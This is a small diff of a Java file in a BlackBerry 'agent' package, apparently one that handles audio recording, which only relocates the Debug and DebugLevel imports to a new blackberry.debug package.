@@ -12,6 +12,8 @@ package blackberry.agent;
 import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.Conf;
+import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
 import blackberry.log.Log;
@@ -20,8 +22,6 @@ import blackberry.record.AudioRecorder;
 import blackberry.record.AudioRecorderDispatcher;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
-import blackberry.utils.Debug;
-import blackberry.utils.DebugLevel;
 import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
